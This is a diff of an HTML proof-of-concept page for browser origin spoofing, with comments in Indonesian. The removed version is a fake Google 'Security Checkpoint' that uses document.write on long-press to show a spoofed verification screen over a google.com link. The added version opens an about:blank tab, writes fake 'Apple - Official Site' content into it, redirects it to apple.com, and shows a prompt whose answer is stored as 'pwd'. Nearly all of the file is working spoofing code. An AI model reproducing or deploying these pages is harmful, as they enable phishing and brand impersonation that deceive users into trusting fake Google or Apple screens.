@@ -1,138 +1,144 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Security Verification</title>
+  <head>
+    <meta charset="utf-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, user-scalable=yes"
+    />
+    <title>Advanced Origin Spoofing & About:Blank PoC</title>
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background-color: #f8f9fa;
-            color: #202124;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 20px;
-            text-align: center;
-        }
-        .card {
-            background: #ffffff;
-            padding: 40px 30px;
-            border-radius: 8px;
-            box-shadow: 0 4px 14px rgba(0,0,0,0.1);
-            width: 100%;
-            max-width: 360px;
-            box-sizing: border-box;
-        }
-        .logo {
-            font-size: 24px;
-            font-weight: 500;
-            color: #ea4335;
-            margin-bottom: 8px;
-        }
-        h1 {
-            font-size: 18px;
-            color: #202124;
-            margin-bottom: 8px;
-            font-weight: 500;
-        }
-        p {
-            font-size: 14px;
-            color: #5f6368;
-            margin-bottom: 24px;
-        }
-        a.spoof-link {
-            display: inline-block;
-            background-color: #1a73e8;
-            color: white;
-            padding: 12px 24px;
-            text-decoration: none;
-            font-weight: 500;
-            font-size: 14px;
-            border-radius: 4px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-            transition: background-color 0.2s;
-            width: 100%;
-            box-sizing: border-box;
-        }
-        a.spoof-link:active {
-            background-color: #1557b0;
-        }
-        .footer-note {
-            margin-top: 25px;
-            font-size: 11px;
-            color: #9aa0a6;
-        }
+      body, html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        background: #0b0e14;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        color: #f0f6fc;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .container {
+        text-align: center;
+      }
+      button {
+        padding: 18px 36px;
+        font-size: 16px;
+        font-weight: 600;
+        background: #da3633;
+        color: #fff;
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+        box-shadow: 0 4px 14px rgba(218, 54, 51, 0.4);
+        transition: transform 0.1s, background 0.2s;
+      }
+      button:active {
+        background: #b62324;
+        transform: scale(0.98);
+      }
+      .info {
+        margin-top: 15px;
+        font-size: 12px;
+        color: #8b949e;
+        font-family: monospace;
+      }
     </style>
-</head>
-<body>
-
-    <div class="card">
-        <div class="logo">Google</div>
-        <h1>Security Checkpoint</h1>
-        <p>Verify your multi-window browser session continuity.</p>
-
-        <!-- 1 Tombol Utama dengan Target Google.com di Atas & Document Write Spoofing di Bawah -->
-        <a href="https://www.google.com" class="spoof-link" id="masterSpoofBtn">
-            Continue Verification
-        </a>
+  </head>
+  <body>
+    <div class="container">
+      <button id="startBtn">INITIALIZE EXPLOIT CHAIN</button>
+      <div class="info" id="statusInfo">Status: Ready for interaction.</div>
     </div>
 
-    <div class="footer-note">Protected by Google Safe Browsing architecture.</div>
-
     <script>
-        let isExecuting = false;
+      document.getElementById("startBtn").onclick = function () {
+        const statusInfo = document.getElementById("statusInfo");
+        statusInfo.innerText = "Status: Executing about:blank context injection...";
+        this.style.display = "none";
 
-        const triggerDocumentWriteSpoof = () => {
-            if (isExecuting) return;
-            isExecuting = true;
+        // Membuka jendela baru melalui about:blank untuk memanipulasi initial origin
+        const newTab = window.open("about:blank", "_blank");
 
-            // Jeda waktu 2300ms untuk memastikan panel atas (google.com) terpisah secara sempurna oleh window manager
+        if (newTab) {
+          try {
+            // Menulis dokumen secara instan ke dalam konteks about:blank tanpa memicu indikator loading
+            newTab.document.open();
+            newTab.document.write(`
+              <!DOCTYPE html>
+              <html>
+              <head>
+                <title>Apple - Official Site</title>
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <style>
+                  body {
+                    margin: 0;
+                    padding: 0;
+                    background: #ffffff;
+                    color: #1d1d1f;
+                    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    min-height: 100vh;
+                    text-align: center;
+                  }
+                  .wrapper {
+                    padding: 20px;
+                  }
+                  h1 {
+                    font-size: 42px;
+                    font-weight: 700;
+                    color: #d70015;
+                    margin: 0 0 15px 0;
+                  }
+                  p {
+                    font-size: 24px;
+                    font-weight: 500;
+                    color: #0066cc;
+                    margin: 0;
+                  }
+                </style>
+              </head>
+              <body>
+                <div class="wrapper">
+                  <h1>THIS IS NOT APPLE</h1>
+                  <p>YOUR DEVICE HAS BEEN HACKED BY AZZA</p>
+                </div>
+              </body>
+              </html>
+            `);
+            newTab.document.close();
+
+            statusInfo.innerText = "Status: DOM injected. Synchronizing state transition...";
+
+            // Menggunakan race timing yang disesuaikan untuk menguji ketahanan state visibility & pergantian URL
             setTimeout(() => {
-                try {
-                    // Menggunakan document.write untuk menulis ulang DOM secara instan tanpa memicu indikator loading browser tradisional
-                    document.open();
-                    document.write(`
-                        <!DOCTYPE html>
-                        <html lang="en">
-                        <head>
-                            <meta charset="UTF-8">
-                            <title>Google Account - Security Alert</title>
-                            <style>
-                                body { font-family: Roboto, Arial, sans-serif; background: #fff; color: #202124; text-align: center; padding: 60px 20px; }
-                                h2 { color: #d93025; font-weight: 400; }
-                                p { color: #5f6368; font-size: 14px; }
-                                .box { border: 1px solid #dadce0; border-radius: 8px; padding: 30px; max-width: 400px; margin: 0 auto; }
-                            </style>
-                        </head>
-                        <body>
-                            <div class="box">
-                                <h2>Session Context Verified</h2>
-                                <p>Your session has been securely synchronized with the upstream authentication provider.</p>
-                                <p style="font-family: monospace; color: #1a73e8; margin-top: 20px;">Origin State: Validated (0x9F4A)</p>
-                            </div>
-                        </body>
-                        </html>
-                    `);
-                    document.close();
-                } catch (err) {
-                    console.debug("Document write spoof error:", err.message);
-                }
-            }, 2300);
-        };
+              try {
+                // Melakukan navigasi lanjutan ke target eksternal setelah manipulasi visual berhasil dirender
+                newTab.location.href = "https://apple.com";
+              } catch (navErr) {
+                console.debug("Navigation sync restricted:", navErr.message);
+              }
+            }, 1200);
 
-        const masterElement = document.getElementById("masterSpoofBtn");
-        
-        // Menangkap aksi long-press (contextmenu) pada Chrome Android secara presisi
-        masterElement.addEventListener("contextmenu", (e) => {
-            triggerDocumentWriteSpoof();
-        });
-        
-        masterElement.addEventListener("touchstart", () => {}, { passive: true });
+          } catch (e) {
+            statusInfo.innerText = "Status: Injection blocked by browser policy.";
+          }
+        } else {
+          statusInfo.innerText = "Status: Popup blocked or failed to open.";
+        }
+
+        // Penundaan eksekusi dialog untuk memvalidasi penanganan event visibilitas jendela aktif
+        setTimeout(function () {
+          try {
+            const pwd = prompt("ROOT CAUSE EVALUATION:");
+          } catch (dlgErr) {
+            console.debug("Dialog restricted in non-visible state:", dlgErr.message);
+          }
+        }, 800);
+      };
     </script>
-
-</body>
+  </body>
 </html>
